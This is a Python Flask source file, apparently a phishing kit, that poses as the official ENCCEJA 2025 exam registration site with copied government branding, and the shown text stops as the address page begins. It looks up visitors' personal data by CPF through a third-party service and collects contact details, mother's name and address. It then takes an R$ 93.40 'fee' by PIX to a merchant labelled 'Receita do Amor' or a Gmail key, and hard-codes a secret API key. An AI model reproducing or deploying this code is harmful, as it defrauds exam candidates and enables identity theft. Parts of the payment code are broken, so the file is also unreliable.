#!/usr/bin/env python3
"""
ENCCEJA 2025 - Sistema de Inscrição VPS
Versão corrigida com fluxo completo: 
inscricao → encceja-info → validar-dados → endereco → local-prova → pagamento → inscricao-sucesso
"""

import os
import re
import json
import time
import random
import string
import logging
import requests
import urllib.parse
from datetime import datetime
from typing import Dict, Any, Optional

from flask import Flask, render_template, request, redirect, url_for, jsonify, session

# Configurar logging para VPS
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/var/log/encceja.log'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "encceja_vps_secret_key_2025")

# Credenciais WitePay
WITEPAY_API_KEY = "sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d"

class WitePayGateway:
    """Gateway de pagamento WitePay para VPS"""
    
    def __init__(self):
        self.api_key = WITEPAY_API_KEY
        self.base_url = "https://api.witepay.com.br"
        
    def create_order(self, client_data: Dict, product_data: Dict) -> Dict:
        """Criar pedido no WitePay"""
        url = f"{self.base_url}/v1/order/create"
        
        headers = {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'clientName': client_data['clientName'],
            'clientDocument': client_data['clientDocument'],
            'clientEmail': client_data['clientEmail'],
            'clientPhone': client_data['clientPhone'],
            'products': [{
                'name': product_data['name'],
                'value': product_data['value']
            }]
        }
        
        try:
            response = requests.post(url, json=payload, headers=headers, timeout=30)
            
            if response.status_code == 201:
                data = response.json()
                return {'success': True, 'data': data}
            else:
                logging.error(f"[VPS] WitePay Order Error: {response.status_code} - {response.text}")
                return {'success': False, 'error': f'Order creation failed: {response.status_code}'}
                
        except Exception as e:
            logging.error(f"[VPS] WitePay Order Exception: {str(e)}")
            return {'success': False, 'error': str(e)}
    
    def create_charge(self, order_id: str, payment_method: str) -> Dict:
        """Criar cobrança PIX"""
        url = f"{self.base_url}/v1/charge/create"
        
        headers = {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }
        
        payload = {
            'orderId': order_id,
            'paymentMethod': payment_method.lower()
        }
        
        try:
            response = requests.post(url, json=payload, headers=headers, timeout=30)
            
            if response.status_code == 201:
                data = response.json()
                return {'success': True, 'data': data}
            else:
                logging.error(f"[VPS] WitePay Charge Error: {response.status_code} - {response.text}")
                return {'success': False, 'error': f'Charge creation failed: {response.status_code}'}
                
        except Exception as e:
            logging.error(f"[VPS] WitePay Charge Exception: {str(e)}")
            return {'success': False, 'error': str(e)}

# Instância global do gateway WitePay
witepay_gateway = WitePayGateway()

def generate_pix_code(amount: float, description: str, merchant_name: str = "Receita do Amor - ENCCEJA") -> str:
    """Gerar código PIX válido padrão Banco Central"""
    transaction_id = f"ENJ{int(time.time())}"
    pix_key = "gerarpagamentos@gmail.com"
    merchant_city = "SAO PAULO"
    
    # Construir código PIX padrão EMV
    amount_str = f"{int(amount * 100):02d}"
    
    pix_base = (
        "00020126"  # Payload Format Indicator
        "830014br.gov.bcb.pix"  # Point of Initiation Method
        f"2561{pix_key}"  # Merchant Account Information
        "52040000"  # Merchant Category Code
        "5303986"  # Transaction Currency (BRL)
        f"54{len(amount_str):02d}{amount_str}"  # Transaction Amount
        f"5925{merchant_name}"  # Merchant Name
        f"6009{merchant_city}"  # Merchant City
        f"62{len(transaction_id):02d}{transaction_id}"  # Additional Data Field Template
        "6304"  # CRC16
    )
    
    # Calcular CRC16
    def calculate_crc16(data):
        crc = 0xFFFF
        for byte in data.encode('utf-8'):
            crc ^= byte << 8
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ 0x1021
                else:
                    crc <<= 1
                crc &= 0xFFFF
        return f"{crc:04X}"
    
    crc = calculate_crc16(pix_base + "6304")
    return pix_base + "6304" + crc

@app.route('/')
def index():
    """Página inicial - redirecionar para inscrição"""
    logging.info("[VPS] Redirecionando página inicial para /inscricao")
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Página de inscrição do ENCCEJA 2025"""
    logging.info("[VPS] Acessando página de inscrição")
    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
    return render_template_string(INSCRICAO_TEMPLATE, user_data=user_data)

@app.route('/encceja-info', methods=['GET', 'POST'])
def encceja_info():
    """Página com informações sobre o ENCCEJA"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        logging.warning("[VPS] Acesso inválido a encceja-info, redirecionando para inscrição")
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        logging.info(f"[VPS] Usuário {user_data.get('nome', 'N/A')} leu informações do ENCCEJA")
        return redirect(url_for('validar_dados'))
    
    return render_template_string(ENCCEJA_INFO_TEMPLATE, user_data=user_data)

@app.route('/validar-dados', methods=['GET', 'POST'])
def validar_dados():
    """Página de validação de dados do usuário"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        logging.warning("[VPS] Acesso inválido a validar-dados, redirecionando para inscrição")
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        # Atualizar dados do usuário
        user_data.update({
            'telefone': request.form.get('telefone', ''),
            'email': request.form.get('email', ''),
            'data_nascimento': request.form.get('data_nascimento', ''),
            'nome_mae': request.form.get('nome_mae', '')
        })
        session['user_data'] = user_data
        logging.info(f"[VPS] Dados validados para {user_data.get('nome', 'N/A')}")
        return redirect(url_for('endereco'))
    
    return render_template_string(VALIDAR_DADOS_TEMPLATE, user_data=user_data)

@app.route('/endereco', methods=['GET', 'POST'])
def endereco():
    """Página de cadastro de endereço"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        logging.warning("[VPS] Acesso inválido a endereco, redirecionando para inscrição")
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        # Atualizar dados do usuário com endereço
        user_data.update({
            'cep': request.form.get('cep', ''),
            'logradouro': request.form.get('logradouro', ''),
            'numero': request.form.get('numero', ''),
            'complemento': request.form.get('complemento', ''),
            'bairro': request.form.get('bairro', ''),
            'cidade': request.form.get('cidade', ''),
            'estado': request.form.get('estado', '')
        })
        session['user_data'] = user_data
        logging.info(f"[VPS] Endereço cadastrado para {user_data.get('nome', 'N/A')}")
        return redirect(url_for('local_prova'))
    
    return render_template_string(ENDERECO_TEMPLATE, user_data=user_data)

@app.route('/local-prova', methods=['GET', 'POST'])
def local_prova():
    """Página de seleção do local de prova"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        logging.warning("[VPS] Acesso inválido a local-prova, redirecionando para inscrição")
        return redirect(url_for('inscricao'))
    
    if request.method == 'POST':
        # Atualizar dados do usuário com local de prova
        user_data.update({
            'local_prova': request.form.get('local_prova', ''),
            'cidade_prova': request.form.get('cidade_prova', ''),
            'estado_prova': request.form.get('estado_prova', '')
        })
        session['user_data'] = user_data
        logging.info(f"[VPS] Local de prova selecionado para {user_data.get('nome', 'N/A')}")
        return redirect(url_for('pagamento'))
    
    return render_template_string(LOCAL_PROVA_TEMPLATE, user_data=user_data)

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    """Página de pagamento PIX"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        logging.warning("[VPS] Acesso inválido a pagamento, redirecionando para inscrição")
        return redirect(url_for('inscricao'))
    
    return render_template_string(PAGAMENTO_TEMPLATE, user_data=user_data)

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """Criar pagamento PIX via WitePay ou fallback"""
    try:
        user_data = session.get('user_data', {})
        amount = 93.40
        description = "Inscrição ENCCEJA 2025"
        
        logging.info(f"[VPS] Criando pagamento PIX R$ {amount:.2f} para {user_data.get('nome', 'N/A')}")
        
        # Tentar WitePay primeiro
        client_data = {
            'clientName': user_data.get('nome', 'Cliente ENCCEJA'),
            'clientDocument': user_data.get('cpf', '12345678901').replace('.', '').replace('-', ''),
            'clientEmail': 'gerarpagamentos@gmail.com',
            'clientPhone': '11987790088'
        }
        
        product_data = {
            'name': 'Receita do Amor',
            'value': int(amount * 100)  # Valor em centavos
        }
        
        # Criar pedido
        order_result = witepay_gateway.create_order(client_data, product_data)
        
        if order_result.get('success'):
            order_id = order_result['data'].get('orderId')
            
            # Criar cobrança PIX
            charge_result = witepay_gateway.create_charge(order_id, "pix")
            
            if charge_result.get('success'):
                charge_data = charge_result['data']
                transaction_id = charge_data.get('chargeId')
                pix_code = charge_data.get('pixCode')
                
                if pix_code:
                    logging.info(f"[VPS] PIX WitePay criado com sucesso: {transaction_id}")
                    
                    response_data = {
                        'success': True,
                        'transactionId': transaction_id,
                        'pixCode': pix_code,
                        'qr_code': pix_code,
                        'amount': amount,
                        'description': description
                    }
                    
                    return jsonify(response_data)
        
        # Fallback: Gerar PIX padrão
        logging.warning("[VPS] WitePay falhou, usando fallback PIX")
        transaction_id = f"ENCCEJA{int(time.time())}"
        pix_code = generate_pix_code(amount, description)
        
        response_data = {
            'success': True,
            'transactionId': transaction_id,
            'pixCode': pix_code,
            'qr_code': pix_code,
            'amount': amount,
            'description': description
        }
        
        logging.info(f"[VPS] PIX fallback criado: {transaction_id}")
        return jsonify(response_data)
        
    except Exception as e:
        logging.error(f"[VPS] Erro ao criar pagamento PIX: {str(e)}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        }), 500

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    user_data = session.get('user_data', {})
    logging.info(f"[VPS] Inscrição finalizada para {user_data.get('nome', 'N/A')}")
    return render_template_string(INSCRICAO_SUCESSO_TEMPLATE, user_data=user_data)

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API alternativa funcionando
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            logging.info(f"[VPS] API CPF response: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                # Armazenar dados na sessão para uso no fluxo
                session['user_data'] = user_data
                
                logging.info(f"[VPS] CPF consultado com sucesso: {cpf} - {user_data.get('nome')}")
                return jsonify(user_data)
            else:
                logging.error(f"[VPS] API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            logging.error(f"[VPS] Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": f"Erro de conexão com a API: {response.status_code}", "sucesso": False}), 500
    
    except Exception as e:
        logging.error(f"[VPS] Erro ao buscar CPF na API: {str(e)}")
        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}", "sucesso": False}), 500

# TEMPLATES HTML INLINE (para facilitar deployment VPS)
INSCRICAO_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inscrição ENCCEJA 2025</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); }
        .inep-header { background-color: #f3f4f6; }
        .form-header { background-color: #2563eb; color: white; }
        .form-footer { background-color: #3b82f6; color: white; }
        .required-star { color: #dc2626; }
        .image-option.selected { background-color: #60a5fa !important; border: 2px solid #2563eb; }
    </style>
    <script>
        let selectedImage = null;
        
        function formatCPF(input) {
            let value = input.value.replace(/\D/g, '');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            input.value = value;
            
            const submitButton = document.getElementById('submit-button');
            if (value.length === 14 && selectedImage !== null) {
                submitButton.disabled = false;
                submitButton.classList.remove('opacity-50');
            } else {
                submitButton.disabled = true;
                submitButton.classList.add('opacity-50');
            }
        }
        
        function unformatCPF(cpf) {
            return cpf.replace(/[^\d]/g, '');
        }
        
        function selectImage(element, imageIndex) {
            document.querySelectorAll('.image-option').forEach(el => {
                el.classList.remove('selected');
            });
            
            element.classList.add('selected');
            selectedImage = imageIndex;
            
            const cpfInput = document.querySelector('#cpf');
            const submitButton = document.getElementById('submit-button');
            
            if (cpfInput.value.length === 14 && selectedImage !== null) {
                submitButton.disabled = false;
                submitButton.classList.remove('opacity-50');
            }
            
            if (imageIndex !== 4) {
                showErrorPopup();
                selectedImage = null;
                element.classList.remove('selected');
                submitButton.disabled = true;
                submitButton.classList.add('opacity-50');
            } else {
                hideErrorPopup();
            }
        }
        
        function showErrorPopup() {
            document.getElementById('error-popup').classList.remove('hidden');
            setTimeout(() => {
                hideErrorPopup();
            }, 3000);
        }
        
        function hideErrorPopup() {
            document.getElementById('error-popup').classList.add('hidden');
        }
        
        function showValidationPopup() {
            document.getElementById('validation-popup').classList.remove('hidden');
        }
        
        function hideValidationPopup() {
            document.getElementById('validation-popup').classList.add('hidden');
        }
        
        function submitForm() {
            const cpfInput = document.querySelector('#cpf');
            const cpf = unformatCPF(cpfInput.value);
            
            showValidationPopup();
            
            fetch(`/consultar-cpf-inscricao?cpf=${cpf}`)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Erro ao consultar CPF');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log("Dados do usuário:", data);
                    
                    if (!data || data.error) {
                        throw new Error(data.error || 'Erro ao processar dados do CPF');
                    }
                    
                    localStorage.setItem('cpfData', JSON.stringify(data));
                    
                    setTimeout(() => {
                        window.location.href = '/encceja-info';
                    }, 1500);
                })
                .catch(error => {
                    console.error("Erro ao buscar CPF:", error);
                    hideValidationPopup();
                    alert("Ocorreu um erro ao validar o CPF. Por favor, tente novamente.");
                });
        }
    </script>
</head>
<body class="flex flex-col min-h-screen">
    <!-- Government Header -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#">
                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" />
            </a>
            <nav>
                <ul class="flex space-x-4 text-[10px]">
                    <li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li>
                    <li><a class="hover:underline" href="#">PARTICIPE</a></li>
                    <li><a class="hover:underline" href="#">SERVIÇOS</a></li>
                </ul>
            </nav>
        </div>
    </header>
    
    <!-- INEP Header -->
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs><style>.cls-2{fill:#333}</style></defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
            </svg>
        </div>
    </div>
    
    <!-- Main Content -->
    <main class="flex-grow py-8">
        <div class="container mx-auto px-4 max-w-3xl">
            <!-- ENCCEJA Logo -->
            <div class="text-center mb-6">
                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" width="420"/>
            </div>
            
            <!-- Form Container -->
            <div class="border border-gray-300 rounded">
                <!-- Form Header -->
                <div class="form-header py-2 px-4 text-center">
                    <h2 class="text-lg">Inscrição > ENCCEJA</h2>
                </div>
                
                <!-- Form Content -->
                <div class="p-4">
                    <p class="mb-4">Para efetuar sua inscrição informe os dados abaixo e clique em enviar:</p>
                    
                    <form>
                        <div class="mb-4">
                            <label class="block mb-1">
                                <span>CPF:</span>
                                <span class="required-star">*</span>
                                <span class="ml-1 text-red-500">
                                    <i class="fas fa-info-circle"></i>
                                </span>
                            </label>
                            <input id="cpf" class="w-full border border-gray-300 p-2 text-base text-[#333] tracking-wide" placeholder="___.___.___-__" type="tel" inputmode="numeric" pattern="[0-9]*" oninput="formatCPF(this)"/>
                        </div>
                        
                        <div class="mb-4">
                            <p class="text-[#2B4F81] text-base font-bold" style="font-size: 16px;">
                                Clique abaixo, na figura FOLHA:
                                <span class="text-red-700 text-lg">*</span>
                                <span class="text-[#2B4F81] text-base rounded-full border border-[#2B4F81] w-5 h-5 inline-flex items-center justify-center">?</span>
                            </p>
                        </div>
                        
                        <div class="flex items-center">
                            <div class="grid grid-cols-5 gap-1 border-4 border-[#D8E8E8] p-1 bg-[#D8E8E8]">
                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 0)">
                                    <img alt="Globe icon" class="w-6 h-6" src="https://i.ibb.co/2Ytyd5h2/download-6.png"/>
                                </div>
                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 1)">
                                    <img alt="Search icon" class="w-6 h-6" src="https://i.ibb.co/cK1RdMv5/download-5.png"/>
                                </div>
                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 2)">
                                    <img alt="Footprint icon" class="w-6 h-6" src="https://i.ibb.co/4wJKGsVJ/download-4.png"/>
                                </div>
                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 3)">
                                    <img alt="Lock icon" class="w-6 h-6" src="https://i.ibb.co/67VXwQ9M/download-3.png"/>
                                </div>
                                <div class="bg-[#d2d2d2] p-2 border border-white flex items-center justify-center image-option" onclick="selectImage(this, 4)">
                                    <img alt="Leaf icon" class="w-6 h-6" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' fill='%23059669' viewBox='0 0 24 24'><path d='M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z'/></svg>"/>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
                
                <!-- Form Footer -->
                <div class="border-t border-gray-300">
                    <div class="p-2 bg-gray-100 flex items-center">
                        <a class="text-gray-700 flex items-center" href="#">
                            <i class="fas fa-sign-out-alt mr-1"></i>
                            Sair
                        </a>
                    </div>
                    <div class="form-footer p-0 flex justify-center items-center">
                        <button id="submit-button" class="flex items-center justify-center w-full h-full py-3 opacity-50" type="button" disabled onclick="submitForm()">
                            <i class="fas fa-paper-plane mr-2"></i>
                            <span>Enviar</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </main>
    
    <!-- Error Popup -->
    <div id="error-popup" class="fixed top-0 left-0 right-0 bg-red-500 text-white p-4 text-center hidden z-50">
        Você deve selecionar a imagem da FOLHA (5ª imagem) para prosseguir.
    </div>
    
    <!-- Validation Popup -->
    <div id="validation-popup" class="fixed inset-0 flex items-center justify-center hidden z-50">
        <div class="absolute inset-0 bg-black bg-opacity-50"></div>
        <div class="bg-[#5d85ab] text-white p-6 rounded-lg shadow-lg z-10 flex flex-col items-center max-w-md mx-4">
            <div class="spinner-border mb-4" role="status">
                <svg class="animate-spin h-10 w-10 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
            </div>
            <h3 class="text-xl font-bold mb-2">Validando seus dados...</h3>
            <p class="text-center">Aguarde enquanto verificamos as informações do CPF.</p>
        </div>
    </div>
</body>
</html>
'''

ENCCEJA_INFO_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informações ENCCEJA 2025</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); }
        .inep-header { background-color: #f3f4f6; }
        .form-header { background-color: #2563eb; color: white; }
        .form-footer { background-color: #3b82f6; color: white; }
        .info-box { background-color: #f0f9ff; border-left: 4px solid #0ea5e9; }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <!-- Header igual ao template anterior -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#"><img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" /></a>
            <nav><ul class="flex space-x-4 text-[10px]"><li><a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a></li><li><a class="hover:underline" href="#">PARTICIPE</a></li><li><a class="hover:underline" href="#">SERVIÇOS</a></li></ul></nav>
        </div>
    </header>
    
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs><style>.cls-2{fill:#333}</style></defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"/>
            </svg>
        </div>
    </div>
    
    <main class="flex-grow py-8">
        <div class="container mx-auto px-4 max-w-3xl">
            <div class="text-center mb-6">
                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" width="420"/>
            </div>
            
            <div class="border border-gray-300 rounded">
                <div class="form-header py-2 px-4 text-center">
                    <h2 class="text-lg">Informações Importantes - ENCCEJA 2025</h2>
                </div>
                
                <div class="p-6">
                    <div class="info-box p-4 mb-6 rounded">
                        <h3 class="font-bold text-blue-800 mb-2"><i class="fas fa-info-circle mr-2"></i>O que é o ENCCEJA?</h3>
                        <p class="text-gray-700">O Exame Nacional para Certificação de Competências de Jovens e Adultos (ENCCEJA) é destinado a jovens e adultos que não concluíram seus estudos na idade apropriada.</p>
                    </div>
                    
                    <div class="grid md:grid-cols-2 gap-6 mb-6">
                        <div class="info-box p-4 rounded">
                            <h4 class="font-bold text-blue-800 mb-2"><i class="fas fa-calendar mr-2"></i>Datas Importantes</h4>
                            <ul class="text-gray-700 space-y-1">
                                <li>• Inscrições: Até 15 de Março de 2025</li>
                                <li>• Provas: 25 de Maio de 2025</li>
                                <li>• Resultados: Julho de 2025</li>
                            </ul>
                        </div>
                        
                        <div class="info-box p-4 rounded">
                            <h4 class="font-bold text-blue-800 mb-2"><i class="fas fa-money-bill mr-2"></i>Taxa de Inscrição</h4>
                            <p class="text-gray-700">A taxa de inscrição é de <strong>R$ 93,40</strong> e deve ser paga via PIX até a data limite.</p>
                        </div>
                    </div>
                    
                    <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
                        <div class="flex">
                            <div class="flex-shrink-0"><i class="fas fa-exclamation-triangle text-yellow-400"></i></div>
                            <div class="ml-3">
                                <p class="text-sm text-yellow-700"><strong>Importante:</strong> Após ler estas informações, você será direcionado para validar seus dados pessoais e prosseguir com o processo de inscrição.</p>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="border-t border-gray-300">
                    <div class="p-2 bg-gray-100 flex items-center">
                        <a class="text-gray-700 flex items-center" href="/inscricao"><i class="fas fa-arrow-left mr-1"></i>Voltar</a>
                    </div>
                    <div class="form-footer p-0 flex justify-center items-center">
                        <form method="POST" class="w-full">
                            <button type="submit" class="flex items-center justify-center w-full h-full py-3">
                                <i class="fas fa-arrow-right mr-2"></i>
                                <span>Li e Compreendi - Continuar</span>
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </main>
</body>
</html>
'''

VALIDAR_DADOS_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validar Dados - ENCCEJA 2025</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); }
        .inep-header { background-color: #f3f4f6; }
        .form-header { background-color: #2563eb; color: white; }
        .form-footer { background-color: #3b82f6; color: white; }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <!-- Headers iguais -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#"><img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" /></a>
        </div>
    </header>
    
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs><style>.cls-2{fill:#333}</style></defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z"/>
            </svg>
        </div>
    </div>
    
    <main class="flex-grow py-8">
        <div class="container mx-auto px-4 max-w-3xl">
            <div class="text-center mb-6">
                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" width="420"/>
            </div>
            
            <div class="border border-gray-300 rounded">
                <div class="form-header py-2 px-4 text-center">
                    <h2 class="text-lg">Validação de Dados - {{ user_data.nome }}</h2>
                </div>
                
                <form method="POST" class="p-6">
                    <div class="grid md:grid-cols-2 gap-4 mb-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Nome Completo</label>
                            <input type="text" value="{{ user_data.nome }}" class="w-full border border-gray-300 p-2 rounded bg-gray-100" readonly>
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">CPF</label>
                            <input type="text" value="{{ user_data.cpf }}" class="w-full border border-gray-300 p-2 rounded bg-gray-100" readonly>
                        </div>
                    </div>
                    
                    <div class="grid md:grid-cols-2 gap-4 mb-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Telefone *</label>
                            <input type="tel" name="telefone" class="w-full border border-gray-300 p-2 rounded" placeholder="(11) 99999-9999" required>
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">E-mail *</label>
                            <input type="email" name="email" class="w-full border border-gray-300 p-2 rounded" placeholder="seuemail@exemplo.com" required>
                        </div>
                    </div>
                    
                    <div class="grid md:grid-cols-2 gap-4 mb-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Data de Nascimento</label>
                            <input type="date" name="data_nascimento" value="{{ user_data.dataNascimento }}" class="w-full border border-gray-300 p-2 rounded">
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Nome da Mãe</label>
                            <input type="text" name="nome_mae" class="w-full border border-gray-300 p-2 rounded" placeholder="Nome completo da mãe">
                        </div>
                    </div>
                    
                    <div class="border-t border-gray-300 mt-6">
                        <div class="form-footer p-0 flex justify-center items-center mt-4">
                            <button type="submit" class="flex items-center justify-center w-full py-3 bg-blue-600 text-white rounded hover:bg-blue-700">
                                <i class="fas fa-arrow-right mr-2"></i>
                                <span>Continuar</span>
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </main>
</body>
</html>
'''

ENDERECO_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Endereço - ENCCEJA 2025</title>
